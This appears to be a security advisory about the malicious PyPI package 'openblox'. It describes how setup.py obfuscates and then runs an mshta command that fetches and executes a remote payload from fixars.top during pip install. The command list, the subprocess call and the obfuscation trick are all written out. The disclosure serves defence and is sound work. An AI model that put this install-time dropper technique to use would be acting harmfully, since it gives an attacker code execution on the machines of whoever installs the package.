summary: openblox 1.0.1 executes obfuscated mshta dropper against https://fixars.top at install time on Windows
details: The package is published as 'openblox' (an 'enterprise-grade Roblox utility') with placeholder author metadata (John / john@example.com / github.com/john/openblox), but the shipped code is unrelated to Roblox. setup.py contains two functions (GetDefaultSystemPolicy, CalculateNodeDrift) that pose as hardware-threshold and thread-latency calculators; they actually compute chr(value+14) across hardcoded integer arrays to produce the strings 'mshta' and 'https://fixars.top'. At module top level, setup.py evaluates GetGitCommitHash(), which on Windows builds GitCmd = ['mshta', 'https://fixars.top'] and runs subprocess.check_output(GitCmd, shell=True). Because this runs at module load, it fires during `pip install` (and any subsequent build/install invocation that loads setup.py). mshta.exe fetches and executes the remote HTA/JScript payload from fixars.top under the installing user's privileges, giving the operator of fixars.top arbitrary remote code execution on Windows installers. The cover-story function names, chr-offset obfuscation of both the command and URL, brand-impersonating package name, and placeholder author identity together rule out a developer mistake.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
